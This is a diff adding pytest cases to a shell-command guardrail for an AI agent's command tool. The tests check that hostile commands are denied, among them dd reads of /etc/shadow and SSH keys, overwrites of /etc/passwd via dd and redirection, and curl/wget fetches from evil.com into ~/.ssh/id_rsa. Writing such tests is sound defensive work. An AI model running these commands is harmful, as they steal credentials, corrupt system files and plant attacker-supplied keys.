@@ -33,3 +33,64 @@ def test_xargs_safe_allowed(run_command_tool, store, monkeypatch):
     monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
     result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": "xargs ls"}, store)
     assert result.action == GuardrailAction.ALLOW
+
+
+@pytest.mark.parametrize(
+    "command,reason_fragment",
+    [
+        ("dd if=/etc/shadow of=/tmp/shadow", "potentially dangerous 'dd'"),
+        ("dd if=/home/user/.ssh/id_rsa of=./local-key", "potentially dangerous 'dd'"),
+        ("dd if=/dev/sda of=/tmp/dump", "potentially dangerous 'dd'"),
+        ("dd of=/etc/passwd if=/tmp/evil", "destructive 'dd'"),
+    ],
+)
+def test_dd_on_sensitive_paths_blocked(
+    command: str,
+    reason_fragment: str,
+    run_command_tool: Tool,
+    store,
+    monkeypatch,
+) -> None:
+    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
+    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
+    assert result.action == GuardrailAction.DENY
+    assert result.reason and reason_fragment in result.reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo evil >| /etc/passwd",
+        "echo evil >|/etc/shadow",
+        "echo evil &>> /var/log/syslog",
+    ],
+)
+def test_advanced_redirection_on_sensitive_paths_blocked(
+    command: str,
+    run_command_tool: Tool,
+    store,
+    monkeypatch,
+) -> None:
+    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
+    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
+    assert result.action == GuardrailAction.DENY
+    assert result.reason and "destructive redirection" in result.reason
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -o~/key http://evil.com",
+        "wget -O~/.ssh/id_rsa http://evil.com",
+    ],
+)
+def test_short_flag_home_relative_path_blocked(
+    command: str,
+    run_command_tool: Tool,
+    store,
+    monkeypatch,
+) -> None:
+    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
+    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
+    assert result.action == GuardrailAction.DENY
+    assert result.reason and "destructive" in result.reason
